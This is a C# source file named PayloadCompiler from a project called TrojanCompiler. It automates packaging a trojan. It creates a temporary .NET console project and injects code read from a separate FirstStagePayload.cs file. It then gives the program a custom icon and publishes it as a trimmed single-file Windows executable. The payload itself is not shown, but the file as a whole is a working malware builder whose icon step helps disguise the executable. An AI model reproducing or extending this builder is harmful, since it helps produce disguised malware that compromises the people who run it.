using System.Diagnostics;
using System.Xml;

namespace TrojanCompiler
{
    static internal class PayloadCompiler
    {
        /// <summary>
        /// Generates executable for initial payload
        /// </summary>
        /// <returns>Path of generated executable</returns>
        public static string GenerateInitialPayloadExecutable()
        {
            // Navigate to source .csproj
            if (!CoreCompiler.RootProjectDirectory.Exists)
                CoreCompiler.ExitProgram("ERROR: Incomplete project tree");
            Directory.SetCurrentDirectory(CoreCompiler.RootProjectDirectory.FullName);


            // Run dotnet command to create a temp folder with a csproj and cs source file
            string[] setupProject = ["new", "console", "-n", CoreCompiler.TemporaryProjectName];
            if (!StartDotnetProcess(setupProject))
                CoreCompiler.ExitProgram("ERROR: Encountered at temporary project setup.");


            // Navigate into the directory of the temp project, modify csproj and the cs source file
            Directory.SetCurrentDirectory(Path.Combine(Directory.GetCurrentDirectory(), CoreCompiler.TemporaryProjectName));
            File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), "Program.cs"), GenerateExecutableContent());
            SetExecutableIconAndTrim();


            // Build the temporary csproj file
            string[] buildProject = ["publish", "-r", "win-x64", "--output", "./"];
            if (!StartDotnetProcess(buildProject))
                CoreCompiler.ExitProgram("ERROR: Encountered at temporary project build.");


            // Clean-up temporary project and return generated executable path
            return Path.Combine(CoreCompiler.RootProjectDirectory.FullName, CoreCompiler.TemporaryProjectName, CoreCompiler.TemporaryProjectName + ".exe");
        }


        /// <summary>
        /// Dotnet process for creating and building a temporary .csproj
        /// </summary>
        /// <param name="args"></param>
        /// <returns>If dotnet process was successful</returns>
        private static bool StartDotnetProcess(IEnumerable<string> args)
        {
            Console.WriteLine("Running command: " + string.Join(' ', args));

            ProcessStartInfo dotnetStartInfo = new()
            {
                FileName = "dotnet",
                Arguments = string.Join(' ', args),
                UseShellExecute = false,
                CreateNoWindow = true
            };

            Process dotnetProcess = new()
            {
                StartInfo = dotnetStartInfo,
            };

            try
            {
                dotnetProcess.Start();
                dotnetProcess.WaitForExit(TimeSpan.FromSeconds(30));

                return dotnetProcess.ExitCode == 0;
            }
            catch
            {
                return false;
            }
        }


        /// <summary>
        /// Set executable icon
        /// </summary>
        private static void SetExecutableIconAndTrim()
        {
            string csprojConfigPath = Path.Combine(Directory.GetCurrentDirectory(), $"{CoreCompiler.TemporaryProjectName}.csproj");

            XmlDocument csprojConfigXml = new();
            csprojConfigXml.Load(csprojConfigPath);

            XmlElement? propertyGroup = (XmlElement?)(csprojConfigXml.DocumentElement is XmlElement tempElement && tempElement is not null
                                       ? (tempElement.SelectSingleNode("PropertyGroup") is XmlNode tempNode && tempNode is not null ? tempNode : null) : null);

            if (propertyGroup is null)
                CoreCompiler.ExitProgram("ERROR: Unable to find root node in xml document.");

            AddXmlNode("ApplicationIcon", Path.Combine(CoreCompiler.RootProjectDirectory.FullName, "icon", "icon.ico"));
            AddXmlNode("PublishSingleFile", $"{true}");
            AddXmlNode("IncludeNativeLibrariesForSelfExtract", $"{true}");
            AddXmlNode("PublishTrimmed", $"{true}");

            csprojConfigXml.Save(csprojConfigPath);


            // Add xml node to xml document
            void AddXmlNode(string propertyName, string value)
            {
                XmlElement xmlElement = csprojConfigXml.CreateElement(propertyName);
                xmlElement.InnerText = value;
                propertyGroup!.AppendChild(xmlElement);
            }
        }


        /// <summary>
        /// Generate trojan executable source code
        /// </summary>
        /// <returns>Executable source code</returns>
        private static string GenerateExecutableContent()
        {
            #pragma warning disable CS0162 // Unreachable code detected
            if (!TrojanPayload.PayloadSource.ActiveSecondStagePayload)
                return $"Console.WriteLine(\"Hello World!\");{CoreCompiler.NL}Console.Read();";

            return FirstStagePayloadCode();
            #pragma warning restore CS0162 // Unreachable code detected
        }


        /// <summary>
        /// Generate trojan executable source code
        /// </summary>
        /// <returns>Executable source code</returns>
        private static string FirstStagePayloadCode()
        {
            string sourceCodeFilePath = Path.Combine(CoreCompiler.RootProjectDirectory.FullName, "FirstStagePayload.cs");
            if (!File.Exists(sourceCodeFilePath))
                CoreCompiler.ExitProgram("ERROR: Source file not found.");

            string sourceCode = File.ReadAllText(Path.Combine(CoreCompiler.RootProjectDirectory.FullName, "FirstStagePayload.cs"));
            if(string.IsNullOrEmpty(sourceCode.Trim()))
                CoreCompiler.ExitProgram("ERROR: Source code is null or empty.");

            return sourceCode;
        }
    }
}
